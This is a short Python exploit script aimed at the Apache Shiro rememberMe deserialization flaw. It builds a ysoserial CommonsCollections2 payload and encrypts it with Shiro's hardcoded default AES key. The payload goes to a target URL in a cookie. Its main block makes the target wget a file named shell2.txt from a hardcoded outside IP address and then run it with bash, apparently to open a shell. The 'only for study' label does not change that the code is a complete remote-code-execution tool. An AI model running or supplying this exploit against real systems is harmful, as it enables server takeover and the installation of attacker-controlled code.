# -*- coding: utf-8 -*-
import requests
import os
import sys
import time
import uuid
import base64
import subprocess
import argparse
from Crypto.Cipher import AES

#get a rememberme payload
def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'CommonsCollections2', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

def exp_shiro(url,cmd):
    payload = encode_rememberme(cmd)
    headers={
        #"Host": "192.168.99.100:8081",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Cookie": "JSESSIONID=CF5804018B87760C96E8908FA1A56149;rememberMe={0}".format(payload.decode()),
        "Upgrade-Insecure-Requests": "1"
    }
    #print("JSESSIONID=CF5804018B87760C96E8908FA1A56149;rememberMe={0}".format(payload.decode()))
    requests.get(url,headers=headers)
parser = argparse.ArgumentParser(description='shiro_exp U can getshell Only for study ',epilog="python shiro_exp.py -u [url] -lh [localhost] -lp [localport]")
parser.add_argument('--url', '-u', help='目的站点的url',required=True)
args = parser.parse_args()
if __name__=='__main__':
    URL=args.url
    try:
        exp_shiro(URL,"wget http://106.15.177.94:8089/shell2.txt -O shell")
        time.sleep(5)
        exp_shiro(URL,"bash shell")
    except Exception as e:
        print(e)
